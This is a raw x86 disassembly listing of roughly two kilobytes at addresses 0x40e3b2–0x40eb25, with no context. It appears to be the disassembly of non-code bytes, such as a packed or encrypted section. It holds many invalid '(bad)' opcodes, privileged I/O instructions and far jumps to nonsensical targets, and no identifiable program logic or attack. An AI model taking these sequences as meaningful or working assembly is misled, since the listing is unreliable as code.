  40e3b2:	outs   dx,DWORD PTR ds:[esi]
  40e3b3:	outs   dx,DWORD PTR ds:[esi]
  40e3b4:	inc    eax
  40e3b5:	pop    ebx
  40e3b6:	xor    bh,BYTE PTR [ebx+0x7cb0611]
  40e3bc:	xchg   ebp,eax
  40e3bd:	test   eax,ecx
  40e3bf:	inc    ebx
  40e3c0:	pop    edi
  40e3c1:	out    0xbf,eax
  40e3c3:	popf   
  40e3c4:	jbe    0x40e400
  40e3c6:	cmp    al,BYTE PTR [edx-0x661fc286]
  40e3cc:	loopne 0x40e372
  40e3ce:	ffree  st(5)
  40e3d0:	add    DWORD PTR [edx+0x26],ebx
  40e3d3:	fisubr WORD PTR [edx-0x78]
  40e3d6:	test   al,0x24
  40e3d8:	adc    ebp,DWORD PTR [ebx+0x7478ef27]
  40e3de:	inc    esp
  40e3df:	xchg   ebx,eax
  40e3e0:	jge    0x40e423
  40e3e2:	push   0x3504d274
  40e3e7:	xchg   ecx,eax
  40e3e8:	lods   eax,DWORD PTR ds:[esi]
  40e3e9:	and    DWORD PTR gs:[ebp-0x1e],ebx
  40e3ed:	ds mov cl,cl
  40e3f0:	stc    
  40e3f1:	dec    edi
  40e3f2:	mov    bl,BYTE PTR [edi-0x68]
  40e3f5:	mov    al,0x2a
  40e3f7:	cli    
  40e3f8:	(bad)  
  40e3f9:	sahf   
  40e3fa:	out    dx,eax
  40e3fb:	pop    ss
  40e3fc:	daa    
  40e3fd:	retf   
  40e3fe:	jmp    0xc1e9d177
  40e403:	sub    eax,0x876602ee
  40e408:	xor    DWORD PTR [esi],edi
  40e40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e40b:	cmp    ebp,DWORD PTR [ecx]
  40e40d:	adc    edi,DWORD PTR [edx]
  40e40f:	inc    esp
  40e410:	mov    bh,0x80
  40e412:	xlat   BYTE PTR ds:[ebx]
  40e413:	push   ebx
  40e414:	lahf   
  40e415:	jl     0x40e482
  40e417:	loope  0x40e3a7
  40e419:	dec    ebp
  40e41a:	dec    ebx
  40e41b:	add    al,BYTE PTR [esi+0x5e]
  40e41e:	sub    eax,0xb63c0f27
  40e423:	and    eax,DWORD PTR [eax-0x47]
  40e426:	dec    ebx
  40e427:	inc    BYTE PTR ds:0x465c0f38
  40e42d:	cli    
  40e42e:	mov    ebx,0x735dc9ab
  40e433:	(bad)  
  40e434:	aam    0xf
  40e436:	jl     0x40e46c
  40e438:	sbb    DWORD PTR [ecx+0x666675c8],ebx
  40e43e:	adc    eax,0x52649fff
  40e443:	fdiv   QWORD PTR [esi-0x392ec5a1]
  40e449:	inc    esp
  40e44a:	xchg   esp,eax
  40e44b:	mov    ecx,0xbbe713ee
  40e450:	imul   ebx,DWORD PTR [edx-0x1ede0d88],0xc1ee13a6
  40e45a:	xchg   DWORD PTR [edi+0x78],edx
  40e45d:	sub    DWORD PTR [edi-0xe74b985],esi
  40e463:	mov    bh,0x48
  40e465:	jmp    0xb5a:0xc8100012
  40e46c:	rol    BYTE PTR [ecx+ebx*8+0x7dc34601],0x76
  40e474:	push   es
  40e475:	mov    esp,0xa78c266b
  40e47a:	pop    eax
  40e47b:	or     eax,0xc3cd8c4c
  40e480:	mov    bh,0xda
  40e482:	int    0xf1
  40e484:	mov    bh,0x31
  40e486:	cmp    BYTE PTR [ebp-0x2f],bl
  40e489:	inc    ebp
  40e48a:	scas   al,BYTE PTR es:[edi]
  40e48b:	add    al,0xc2
  40e48d:	popf   
  40e48e:	and    eax,0x2b54d238
  40e493:	stos   BYTE PTR es:[edi],al
  40e494:	lahf   
  40e495:	push   ecx
  40e496:	ins    DWORD PTR es:[edi],dx
  40e497:	and    cl,BYTE PTR [esi+0x74]
  40e49a:	mov    al,ds:0x44a6e561
  40e49f:	push   eax
  40e4a0:	les    ebx,FWORD PTR [ebx-0x34215ecd]
  40e4a6:	icebp  
  40e4a7:	cld    
  40e4a8:	inc    edi
  40e4a9:	repnz mov bh,0x26
  40e4ac:	(bad)
  40e4b0:	aas    
  40e4b1:	add    al,0xfe
  40e4b3:	push   ss
  40e4b4:	mov    al,ds:0x35948fbc
  40e4b9:	xor    DWORD PTR [edi-0x51161201],0xa22de457
  40e4c3:	mov    al,0xcf
  40e4c5:	jns    0x40e44c
  40e4c7:	mov    esp,0xcf7d2ce6
  40e4cc:	and    esi,DWORD PTR ds:0xad676fad
  40e4d2:	sub    DWORD PTR [eax+0x4cdf564d],ecx
  40e4d8:	fist   DWORD PTR ds:0x56cdb6b5
  40e4de:	dec    ecx
  40e4df:	jmp    0x40e4f4
  40e4e1:	sbb    DWORD PTR ds:0xca781e6c,ebx
  40e4e7:	add    al,0x36
  40e4e9:	mov    eax,0x9ce2f3c4
  40e4ee:	nop
  40e4ef:	jb     0x40e4fd
  40e4f1:	hlt    
  40e4f2:	adc    DWORD PTR [edi-0x42b75ee8],esp
  40e4f8:	ins    BYTE PTR es:[edi],dx
  40e4f9:	push   edi
  40e4fa:	in     eax,dx
  40e4fb:	sbb    al,0xac
  40e4fd:	ror    DWORD PTR [ecx+0x4d3a0214],cl
  40e503:	mov    al,0x0
  40e505:	mov    eax,0xb6b7b9ca
  40e50a:	inc    ecx
  40e50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e50c:	push   ss
  40e50d:	ret    
  40e50e:	push   ecx
  40e50f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e510:	std    
  40e511:	xchg   esp,eax
  40e512:	push   0x8
  40e514:	mov    BYTE PTR [edx-0x7b],dl
  40e517:	sub    al,0x44
  40e519:	mov    edx,edi
  40e51b:	mov    ds:0x9a4f4438,eax
  40e520:	inc    eax
  40e521:	test   eax,0xcf09fbb2
  40e526:	or     eax,0xbe95b409
  40e52b:	jo     0x40e4cc
  40e52d:	sbb    ah,cl
  40e52f:	jns    0x40e578
  40e531:	pop    esp
  40e532:	int3   
  40e533:	pop    ds
  40e534:	add    eax,0xe4bcc423
  40e539:	sar    al,0xc4
  40e53c:	add    esi,DWORD PTR [edx]
  40e53e:	jl     0x40e599
  40e540:	scas   eax,DWORD PTR es:[edi]
  40e541:	ins    DWORD PTR es:[edi],dx
  40e542:	jbe    0x40e4d1
  40e544:	dec    ebx
  40e545:	mov    bh,BYTE PTR [eax+0x1bcaabd7]
  40e54b:	loopne 0x40e4ee
  40e54d:	push   ss
  40e54e:	jmp    0x4c58:0x5ac7c54b
  40e555:	int    0x82
  40e557:	mov    eax,ds:0x700f0989
  40e55c:	cmp    al,0x1a
  40e55e:	lds    esp,FWORD PTR [ecx+0x23121f1b]
  40e564:	leave  
  40e565:	out    dx,eax
  40e566:	out    dx,eax
  40e567:	xchg   BYTE PTR [ebx-0x477cefe7],bl
  40e56d:	arpl   cx,di
  40e56f:	pop    edx
  40e570:	adc    eax,0x201e50a0
  40e575:	sbb    al,0xe6
  40e577:	loopne 0x40e56b
  40e579:	dec    esp
  40e57a:	sub    al,0x3a
  40e57c:	or     edi,DWORD PTR [ebp-0x4b0ae777]
  40e582:	sbb    eax,0x9ce0f19c
  40e587:	mov    edi,0x3c6e930
  40e58c:	mov    ds:0x75eb3604,al
  40e591:	sbb    BYTE PTR [ecx+0x43af087f],0x79
  40e598:	out    dx,eax
  40e599:	out    0xd3,eax
  40e59b:	fld    DWORD PTR [eax-0x1fe79956]
  40e5a1:	(bad)  
  40e5a2:	outs   dx,BYTE PTR ds:[esi]
  40e5a3:	neg    BYTE PTR [edi-0x9a8009c]
  40e5a9:	aam    0xd
  40e5ab:	in     al,dx
  40e5ac:	test   eax,0xba7ac556
  40e5b1:	xor    al,0xf4
  40e5b3:	push   esi
  40e5b4:	mov    BYTE PTR [ecx+0x6fdce42f],dl
  40e5ba:	rsqrtps xmm6,xmm3
  40e5bd:	dec    ecx
  40e5be:	sbb    edi,DWORD PTR [ebp-0x9]
  40e5c1:	stos   DWORD PTR es:[edi],eax
  40e5c2:	mov    edi,0x1f75b43c
  40e5c7:	push   esi
  40e5c8:	xor    DWORD PTR [edx],ecx
  40e5ca:	sbb    BYTE PTR [ecx],bh
  40e5cc:	daa    
  40e5cd:	nop
  40e5ce:	jg     0x40e5dc
  40e5d0:	push   0x89676359
  40e5d5:	push   edi
  40e5d6:	js     0x40e573
  40e5d8:	nop
  40e5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5da:	jo     0x40e65a
  40e5dc:	sbb    BYTE PTR [eax],dl
  40e5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5df:	leave  
  40e5e0:	xor    BYTE PTR [ebp-0x25],dl
  40e5e3:	iret   
  40e5e4:	imul   ebx,esi,0x8e8f5d4d
  40e5ea:	adc    cl,dl
  40e5ec:	jo     0x40e637
  40e5ee:	and    DWORD PTR [edi-0x33],ebx
  40e5f1:	xor    al,dl
  40e5f3:	pop    ebx
  40e5f4:	leave  
  40e5f5:	push   ebx
  40e5f6:	arpl   WORD PTR [ecx+0x7a],cx
  40e5f9:	call   0xe34f:0xabe2e3da
  40e600:	or     cl,BYTE PTR [edx+0x29d1b6ec]
  40e606:	loope  0x40e602
  40e608:	adc    al,0x8b
  40e60a:	add    dl,BYTE PTR [edi+0x7b]
  40e60d:	dec    ebp
  40e60e:	leave  
  40e60f:	inc    edx
  40e610:	aam    0x3e
  40e612:	and    esi,esp
  40e614:	ficomp DWORD PTR [ebp-0x5a684d38]
  40e61a:	mov    esp,0xfb29d390
  40e61f:	push   esi
  40e620:	jg     0x40e5ef
  40e622:	add    edx,DWORD PTR [esi+0x6fa7f997]
  40e628:	sbb    esi,DWORD PTR [edi]
  40e62a:	inc    ebp
  40e62b:	push   esi
  40e62c:	stos   BYTE PTR es:[edi],al
  40e62d:	bound  edx,QWORD PTR [ecx-0x8]
  40e630:	or     dh,BYTE PTR [esi-0x13f2c2a7]
  40e636:	jb     0x40e61e
  40e638:	push   ecx
  40e639:	adc    eax,0x61bf012a
  40e63e:	push   esp
  40e63f:	inc    ebp
  40e640:	sbb    ch,BYTE PTR [edx-0x46]
  40e643:	pop    eax
  40e644:	xchg   DWORD PTR [ecx],esi
  40e646:	jo     0x40e673
  40e648:	enter  0xbf3e,0x6a
  40e64c:	mov    dh,0x8f
  40e64e:	dec    ebx
  40e64f:	inc    DWORD PTR [ebx-0x7b]
  40e652:	jmp    FWORD PTR ds:0x423daf36
  40e658:	mov    ch,0xf3
  40e65a:	loop   0x40e69f
  40e65c:	jb     0x40e6ce
  40e65e:	call   DWORD PTR [ecx+0x14865ecb]
  40e664:	(bad)  
  40e665:	mov    dl,0x4a
  40e667:	xor    bl,BYTE PTR [ecx-0x6917794c]
  40e66d:	inc    ebx
  40e66e:	fild   DWORD PTR [ebp+0x18c4f626]
  40e674:	adc    ecx,ebx
  40e676:	xchg   ecx,esp
  40e678:	adc    eax,DWORD PTR gs:[ebp-0x4d6a8878]
  40e67f:	inc    eax
  40e680:	pushf  
  40e681:	fdiv   st(4),st
  40e683:	dec    eax
  40e684:	ds jbe 0x40e675
  40e687:	fsub   DWORD PTR [edx]
  40e689:	in     eax,0x6e
  40e68b:	sbb    al,bh
  40e68d:	int3   
  40e68e:	idiv   DWORD PTR [edi+0x16]
  40e691:	nop
  40e692:	mov    BYTE PTR [eax+0x5082a2d2],dh
  40e698:	lahf   
  40e699:	pop    ebp
  40e69a:	stc    
  40e69b:	mov    eax,DWORD PTR ds:0x128829af
  40e6a1:	push   edx
  40e6a2:	retf   0x212b
  40e6a5:	push   0xffffffd6
  40e6a7:	repnz out dx,eax
  40e6a9:	rcr    BYTE PTR [eax],1
  40e6ab:	rcr    DWORD PTR [edi-0x15866d87],0xb3
  40e6b2:	and    BYTE PTR [ebp+0x13],bl
  40e6b5:	enterw 0xb98b,0x38
  40e6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6bb:	ins    DWORD PTR es:[edi],dx
  40e6bc:	aad    0x17
  40e6be:	outs   dx,DWORD PTR ds:[esi]
  40e6bf:	ins    DWORD PTR es:[edi],dx
  40e6c0:	adc    BYTE PTR [esi-0xf],0x47
  40e6c4:	adc    esi,esi
  40e6c6:	ins    DWORD PTR es:[edi],dx
  40e6c7:	in     al,0x14
  40e6c9:	sbb    BYTE PTR ds:0xc61c3dba,bl
  40e6cf:	adc    DWORD PTR [edi+edi*2-0x6a2bd096],ebx
  40e6d6:	pusha  
  40e6d7:	cmp    eax,0x49c85a90
  40e6dc:	fadd   DWORD PTR [edx+0x70]
  40e6df:	mov    ecx,0xb9576d00
  40e6e4:	retf   
  40e6e5:	jne    0x40e6b3
  40e6e7:	ja     0x40e68c
  40e6e9:	call   0x5289fd34
  40e6ee:	mov    edi,0xefd6498a
  40e6f3:	ins    BYTE PTR es:[edi],dx
  40e6f4:	xor    al,BYTE PTR [edi-0x13]
  40e6f7:	mov    edx,0x28dda614
  40e6fc:	jbe    0x40e6a3
  40e6fe:	adc    DWORD PTR gs:[ecx-0x32171bca],0x4c
  40e706:	jle    0x40e77e
  40e708:	(bad)  
  40e709:	cmp    eax,0x4e88fa8
  40e70e:	mov    cl,0x95
  40e710:	scas   eax,DWORD PTR es:[edi]
  40e711:	imul   esi,DWORD PTR [ebp+0x3cceee27],0x140009bc
  40e71b:	imul   esp,DWORD PTR [ebx],0x26c6bda9
  40e721:	xor    eax,0x6bd73d01
  40e726:	aas    
  40e727:	fdivrp st(0),st
  40e729:	or     DWORD PTR [eax-0x50],esi
  40e72c:	mov    ebx,0xdc4ccf8f
  40e731:	aaa    
  40e732:	hlt    
  40e733:	dec    edi
  40e734:	mov    al,ah
  40e736:	sub    DWORD PTR [esi-0x5e],0x6b94779b
  40e73d:	inc    ebp
  40e73e:	in     eax,0x57
  40e740:	js     0x40e750
  40e742:	sbb    esi,edx
  40e744:	ffreep st(2)
  40e746:	les    esi,FWORD PTR [edx+ecx*8]
  40e749:	and    eax,0x7340737c
  40e74e:	aas    
  40e74f:	dec    edi
  40e750:	mov    eax,?
  40e752:	sar    BYTE PTR [eax],cl
  40e754:	inc    esi
  40e755:	jo     0x40e77e
  40e757:	adc    BYTE PTR [ebx+0x7c],dl
  40e75a:	mov    eax,ds:0xd7a1e3c1
  40e75f:	mov    ds:0xec996306,al
  40e764:	cmc    
  40e765:	fisttp DWORD PTR [ebx-0x38f6d4b]
  40e76b:	xchg   esp,eax
  40e76c:	imul   edx,DWORD PTR [edx+0x20b7fe3c],0xffffffac
  40e773:	aaa    
  40e774:	fimul  WORD PTR [ecx-0x16]
  40e777:	xor    edi,DWORD PTR [esi-0x28]
  40e77a:	cmovne ecx,DWORD PTR [edx-0x360c32f8]
  40e781:	lods   al,BYTE PTR ds:[esi]
  40e782:	les    eax,FWORD PTR [ecx]
  40e784:	cmp    al,0x1f
  40e786:	addr16 (bad) 
  40e788:	adc    eax,0xc0c30bde
  40e78d:	cmc    
  40e78e:	xchg   edi,eax
  40e78f:	clc    
  40e790:	ror    ah,cl
  40e792:	je     0x40e7c7
  40e794:	xcrypt-ofb (bad)
  40e795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e796:	jmp    0xc278:0x2426191a
  40e79d:	idiv   al
  40e79f:	mov    esi,0xc93a2b18
  40e7a4:	shl    BYTE PTR [esi+0x8],cl
  40e7a7:	div    DWORD PTR [eax+0x6c]
  40e7aa:	stos   BYTE PTR es:[edi],al
  40e7ab:	jnp    0x40e764
  40e7ad:	adc    al,BYTE PTR [edi]
  40e7af:	test   BYTE PTR [esi-0x5df05361],al
  40e7b5:	push   ds
  40e7b6:	in     al,dx
  40e7b7:	(bad)  
  40e7b8:	sub    al,0x37
  40e7ba:	mov    al,0x73
  40e7bc:	imul   edi,DWORD PTR [eax+ebp*1+0x5b],0xf0807e04
  40e7c4:	mov    eax,DWORD PTR ds:0xd288461c
  40e7ca:	test   eax,0x470025e7
  40e7cf:	call   DWORD PTR [edi]
  40e7d1:	(bad)  
  40e7d2:	jo     0x40e7c2
  40e7d4:	push   ecx
  40e7d5:	pop    ebp
  40e7d6:	push   esp
  40e7d7:	stos   BYTE PTR es:[edi],al
  40e7d8:	jne    0x40e83e
  40e7da:	mov    ah,0xfe
  40e7dc:	aad    0x8
  40e7de:	stos   BYTE PTR es:[edi],al
  40e7df:	ins    BYTE PTR es:[edi],dx
  40e7e0:	leave  
  40e7e1:	push   0xffffff81
  40e7e3:	in     eax,0xc5
  40e7e5:	ds je  0x40e7d5
  40e7e8:	mov    BYTE PTR [esi-0x40da47c7],bl
  40e7ee:	sbb    BYTE PTR [esi-0x6d],dl
  40e7f1:	fcom   st(5)
  40e7f3:	xchg   ebp,eax
  40e7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7f5:	cld    
  40e7f6:	mov    edx,0x338bdb37
  40e7fb:	cmc    
  40e7fc:	or     ah,BYTE PTR [ecx]
  40e7fe:	inc    ecx
  40e7ff:	(bad)  
  40e800:	test   BYTE PTR [ecx],al
  40e802:	or     al,0x91
  40e804:	add    edx,DWORD PTR [esi]
  40e806:	test   al,0x65
  40e808:	ror    DWORD PTR [ebp+0x20],0xfe
  40e80c:	and    al,0x21
  40e80e:	setge  BYTE PTR [eax-0x738db521]
  40e815:	mov    cl,0x69
  40e817:	add    ch,ch
  40e819:	das    
  40e81a:	stos   BYTE PTR es:[edi],al
  40e81b:	je     0x40e843
  40e81d:	ins    DWORD PTR es:[edi],dx
  40e81e:	xchg   ebp,eax
  40e81f:	xchg   esi,eax
  40e820:	iret   
  40e821:	xor    bl,ah
  40e823:	cmp    al,0xdb
  40e825:	test   BYTE PTR ds:0x6d57863,dh
  40e82b:	jno    0x40e7f6
  40e82d:	ficomp WORD PTR [edi+0x48]
  40e830:	pusha  
  40e831:	sub    eax,0x7cd984b6
  40e836:	push   esp
  40e837:	and    ecx,DWORD PTR [ecx+0x64]
  40e83a:	pop    esi
  40e83b:	or     ch,cl
  40e83d:	hlt    
  40e83e:	(bad)  
  40e83f:	mov    WORD PTR [esi],es
  40e841:	mov    ebx,0x94b05dad
  40e846:	pushf  
  40e847:	xor    bh,BYTE PTR [esi+0x39]
  40e84a:	add    eax,DWORD PTR [edi+0x3a]
  40e84d:	lock out dx,al
  40e84f:	aaa    
  40e850:	sbb    al,0x77
  40e852:	sub    al,0x77
  40e854:	dec    esi
  40e855:	mov    cl,0xb7
  40e857:	cmp    al,0x31
  40e859:	test   al,0x84
  40e85b:	inc    esi
  40e85c:	or     BYTE PTR [edx+0x4e],ch
  40e85f:	xor    al,0xbc
  40e861:	inc    ecx
  40e862:	pop    es
  40e863:	test   eax,0x1b050854
  40e868:	leave  
  40e869:	in     eax,dx
  40e86a:	(bad)  
  40e86b:	push   ebp
  40e86c:	and    al,0x97
  40e86e:	sbb    BYTE PTR [eax],0x93
  40e871:	fidivr WORD PTR [ecx+ecx*2+0x15]
  40e875:	sbb    BYTE PTR [ebp+0x75],ah
  40e878:	or     bl,ch
  40e87a:	lea    ebx,[esi]
  40e87c:	fidivr DWORD PTR [ebx+0x4c7274df]
  40e882:	sub    BYTE PTR [ebx],ch
  40e884:	loop   0x40e8dc
  40e886:	mov    ecx,0xcbb93ef7
  40e88b:	pop    edi
  40e88c:	xchg   esp,eax
  40e88d:	pop    edx
  40e88e:	out    0xee,al
  40e890:	push   esp
  40e891:	xlat   BYTE PTR ds:[ebx]
  40e892:	sub    edx,DWORD PTR ss:[eax-0x27]
  40e896:	jne    0x40e8b9
  40e898:	push   cs
  40e899:	xor    cl,BYTE PTR [ecx+0x6402a731]
  40e89f:	in     al,0xb9
  40e8a1:	lds    edx,FWORD PTR [ebx+0x2cefb14f]
  40e8a7:	xchg   ecx,eax
  40e8a8:	pop    ds
  40e8a9:	xchg   edi,eax
  40e8aa:	and    al,0xc
  40e8ac:	aas    
  40e8ad:	dec    ecx
  40e8ae:	adc    BYTE PTR [edx+eax*1],0x35
  40e8b2:	dec    edi
  40e8b3:	int3   
  40e8b4:	aam    0x3c
  40e8b6:	mov    esp,0x6cb700e2
  40e8bb:	push   esp
  40e8bc:	ja     0x40e840
  40e8be:	xchg   DWORD PTR [eax+0x3a6399e7],edx
  40e8c4:	out    0x9e,al
  40e8c6:	aaa    
  40e8c7:	mov    edx,0x8c242bd6
  40e8cc:	push   0x58237fb3
  40e8d1:	ins    DWORD PTR es:[edi],dx
  40e8d2:	mov    al,0xe8
  40e8d4:	dec    ebp
  40e8d5:	push   edi
  40e8d6:	(bad)  
  40e8d7:	in     eax,0x3e
  40e8d9:	push   ds
  40e8da:	lods   eax,DWORD PTR ds:[esi]
  40e8db:	jb     0x40e8f2
  40e8dd:	xlat   BYTE PTR ds:[ebx]
  40e8de:	imul   edi,esp,0x4e
  40e8e1:	mov    dh,0x73
  40e8e3:	xchg   ebp,eax
  40e8e4:	inc    esi
  40e8e5:	(bad)  
  40e8e6:	out    dx,al
  40e8e7:	and    al,0x80
  40e8e9:	pop    ebp
  40e8ea:	dec    ebx
  40e8eb:	outs   dx,BYTE PTR ds:[esi]
  40e8ec:	xchg   esi,eax
  40e8ed:	fwait
  40e8ee:	xor    DWORD PTR [esi-0x1a],ecx
  40e8f1:	cmc    
  40e8f2:	pop    esi
  40e8f3:	test   eax,0xc3f71230
  40e8f8:	mov    ds:0x8ee2c4e3,eax
  40e8fd:	ret    0x77de
  40e900:	xchg   ecx,eax
  40e901:	mov    bl,BYTE PTR [esi-0x31]
  40e904:	out    0x54,eax
  40e906:	bound  edx,QWORD PTR [edi-0x7]
  40e909:	retf   
  40e90a:	in     al,0x8a
  40e90c:	ss mov esp,0x5971cc79
  40e912:	sbb    eax,0x3b89838f
  40e917:	lds    ecx,FWORD PTR [edx-0x90a483b]
  40e91d:	push   es
  40e91e:	and    eax,0x5daf64c2
  40e923:	pop    ss
  40e924:	fs dec esp
  40e926:	mov    al,0x82
  40e928:	je     0x40e97e
  40e92a:	or     al,0x73
  40e92c:	lea    ebp,[eax+0x62]
  40e92f:	pop    ebx
  40e930:	sub    DWORD PTR [ecx],0x9443e819
  40e936:	sbb    ecx,esp
  40e938:	pop    eax
  40e939:	and    BYTE PTR [edi-0x4a5f7b72],bl
  40e93f:	jle    0x40e9ad
  40e941:	mov    ecx,0x326dc240
  40e946:	jnp    0x40e99d
  40e948:	or     BYTE PTR [edi],cl
  40e94a:	jnp    0x40e901
  40e94c:	jne    0x40e975
  40e94e:	ins    BYTE PTR es:[edi],dx
  40e94f:	push   eax
  40e950:	sbb    al,BYTE PTR [ebx]
  40e952:	cdq    
  40e953:	adc    eax,0x9d43c038
  40e958:	pusha  
  40e959:	or     edx,DWORD PTR [ebp+eax*8+0x78]
  40e95d:	(bad)  
  40e95e:	arpl   bx,cx
  40e960:	and    ebp,edx
  40e962:	dec    ebx
  40e963:	mov    cl,cl
  40e965:	push   0xfffffffb
  40e967:	adc    dh,0x38
  40e96a:	mov    ebp,0xb312430
  40e96f:	pusha  
  40e970:	sbb    dh,BYTE PTR [ecx-0x30b25468]
  40e976:	add    DWORD PTR [edx-0x1],eax
  40e979:	mov    al,BYTE PTR [edx-0x1cfff02b]
  40e97f:	push   es
  40e980:	shl    DWORD PTR [edx],1
  40e982:	push   edi
  40e983:	fild   QWORD PTR [ebx+0x75ad45da]
  40e989:	add    BYTE PTR [ebx+0x65],ah
  40e98c:	push   ss
  40e98d:	xlat   BYTE PTR ds:[ebx]
  40e98e:	dec    BYTE PTR [edi]
  40e990:	into   
  40e991:	sahf   
  40e992:	pop    ds
  40e993:	push   0xffffffc0
  40e995:	adc    al,0xaa
  40e997:	pop    ecx
  40e998:	add    DWORD PTR [esi-0x6a9d786e],esp
  40e99e:	inc    DWORD PTR [ecx+esi*8]
  40e9a1:	sbb    al,0xb9
  40e9a3:	xchg   ebx,eax
  40e9a4:	mov    dh,0x6a
  40e9a6:	xor    BYTE PTR [edi-0x41f5c213],bh
  40e9ac:	lea    esp,[esi]
  40e9ae:	inc    edi
  40e9af:	xor    DWORD PTR [edx+0x37],esi
  40e9b2:	(bad)  [eax+0x54]
  40e9b5:	dec    ecx
  40e9b6:	pop    ebx
  40e9b7:	mov    ah,0xa7
  40e9b9:	xchg   ebx,eax
  40e9ba:	cwde   
  40e9bb:	fisttp QWORD PTR [ebx]
  40e9bd:	in     al,0xe3
  40e9bf:	cmc    
  40e9c0:	stos   BYTE PTR es:[edi],al
  40e9c1:	(bad)  
  40e9c2:	(bad)  
  40e9c3:	or     eax,0xfd170750
  40e9c8:	inc    edi
  40e9c9:	xor    al,0xb6
  40e9cb:	addr16 xchg esi,eax
  40e9cd:	fstp   DWORD PTR [ebp-0x10399c52]
  40e9d3:	daa    
  40e9d4:	push   ss
  40e9d5:	into   
  40e9d6:	sub    dh,ah
  40e9d8:	mov    bl,0x1a
  40e9da:	and    eax,0x16b7f23d
  40e9df:	jle    0x40ea17
  40e9e1:	mov    esp,0x1787ba88
  40e9e6:	cs cmp eax,0xe6b9a8cd
  40e9ec:	adc    bl,dh
  40e9ee:	loope  0x40ea11
  40e9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9f1:	cwde   
  40e9f2:	jl     0x40e9d0
  40e9f4:	or     cl,BYTE PTR [edx+0x6df14962]
  40e9fa:	jno    0x40ea18
  40e9fc:	pop    es
  40e9fd:	cli    
  40e9fe:	es loop 0x40ea4a
  40ea01:	sar    BYTE PTR [ebx+0x38],cl
  40ea04:	lock jl 0x40e9be
  40ea07:	dec    esp
  40ea08:	xchg   ecx,eax
  40ea09:	jmp    0x7d55:0x88d82139
  40ea10:	adc    DWORD PTR [edx],esi
  40ea12:	jl     0x40e9e0
  40ea14:	xlat   BYTE PTR ds:[ebx]
  40ea15:	jno    0x40e9a8
  40ea17:	dec    esi
  40ea18:	and    DWORD PTR [edi],ebx
  40ea1a:	push   ds
  40ea1b:	outs   dx,DWORD PTR ds:[esi]
  40ea1c:	cmp    dl,BYTE PTR [edi+edx*8]
  40ea1f:	(bad)  
  40ea20:	sbb    edi,DWORD PTR [edx]
  40ea22:	iret   
  40ea23:	dec    ebp
  40ea24:	or     eax,0x2602a824
  40ea29:	(bad)  [esi]
  40ea2b:	xor    eax,0x847fd767
  40ea30:	and    bh,BYTE PTR [edx-0x733cf2a2]
  40ea36:	pop    edx
  40ea37:	push   ss
  40ea38:	push   esi
  40ea39:	fisubr WORD PTR [edi]
  40ea3b:	inc    esp
  40ea3c:	and    DWORD PTR [ecx+0x628d30d],ebp
  40ea42:	icebp  
  40ea43:	inc    eax
  40ea44:	in     eax,dx
  40ea45:	and    eax,0xa5d06a04
  40ea4a:	fidiv  DWORD PTR [edi]
  40ea4c:	stos   DWORD PTR es:[edi],eax
  40ea4d:	adc    DWORD PTR [esi-0x2fa4bca1],ecx
  40ea53:	xor    al,0x36
  40ea55:	push   0x4aa8c94d
  40ea5a:	les    edi,FWORD PTR [ebp+0x16]
  40ea5d:	stos   BYTE PTR es:[edi],al
  40ea5e:	sub    DWORD PTR [ebp+0x5f5e67af],esp
  40ea64:	test   BYTE PTR [ebx],al
  40ea66:	fwait
  40ea67:	lea    edx,ds:0xf1a60c4
  40ea6d:	mov    esi,0x55358438
  40ea72:	jg     0x40ea87
  40ea74:	adc    BYTE PTR [ebx],cl
  40ea76:	xchg   ebx,eax
  40ea77:	and    dh,BYTE PTR [esi+0x531bd099]
  40ea7d:	lahf   
  40ea7e:	ins    DWORD PTR es:[edi],dx
  40ea7f:	sbb    al,0xec
  40ea81:	xchg   ecx,eax
  40ea82:	pusha  
  40ea83:	adc    eax,DWORD PTR [ebx+0x42495b42]
  40ea89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea8a:	mov    eax,0x2fd15c94
  40ea8f:	add    DWORD PTR [ecx-0x1381f214],edx
  40ea95:	mov    ah,0x8c
  40ea97:	adc    DWORD PTR [ebp+0x6e070e43],0xa8352053
  40eaa1:	ss mov ah,0x5e
  40eaa4:	(bad)  
  40eaa6:	sub    bl,cl
  40eaa8:	sbb    eax,0xae4c507b
  40eaad:	call   0x762db636
  40eab2:	cdq    
  40eab3:	mov    cs,WORD PTR [eax-0x6a]
  40eab6:	dec    ebp
  40eab7:	mov    WORD PTR [esi-0x2b3757bf],fs
  40eabd:	(bad)  
  40eabe:	adc    eax,0x51898f33
  40eac3:	cmp    esp,DWORD PTR [ebp-0x40]
  40eac6:	add    DWORD PTR [edx+0x2725d055],esp
  40eacc:	mov    bl,0x26
  40eace:	cmp    eax,0xfcedc024
  40ead3:	inc    esp
  40ead4:	push   esi
  40ead5:	retf   
  40ead6:	xchg   ecx,eax
  40ead7:	xchg   ebp,eax
  40ead8:	adc    BYTE PTR ds:0x8d4a036d,al
  40eade:	pop    edi
  40eadf:	ins    BYTE PTR es:[edi],dx
  40eae0:	shl    DWORD PTR [eax],0x4d
  40eae3:	lds    edi,FWORD PTR [edx+0x33]
  40eae6:	js     0x40eae6
  40eae8:	je     0x40ea78
  40eaea:	mov    al,0xd3
  40eaec:	xchg   edi,eax
  40eaed:	mov    ds:0x41fed4e6,al
  40eaf2:	out    0xc7,eax
  40eaf4:	es ss aad 0x1d
  40eaf8:	shl    DWORD PTR [ebx+ebp*1+0x1a837bdd],cl
  40eaff:	inc    edx
  40eb00:	pushf  
  40eb01:	xchg   esp,eax
  40eb02:	mov    dh,BYTE PTR [esi-0x5fcc97b0]
  40eb08:	and    eax,0xb549d903
  40eb0d:	pop    ebx
  40eb0e:	push   ecx
  40eb0f:	cmp    bl,BYTE PTR [ebp-0x50a17c1a]
  40eb15:	jg     0x40ead5
  40eb17:	cmc    
  40eb18:	and    edi,ecx
  40eb1a:	mov    ebx,0x7796a380
  40eb1f:	xchg   esp,eax
  40eb20:	call   0xda658e33
  40eb25:	jmp    0x40eac7
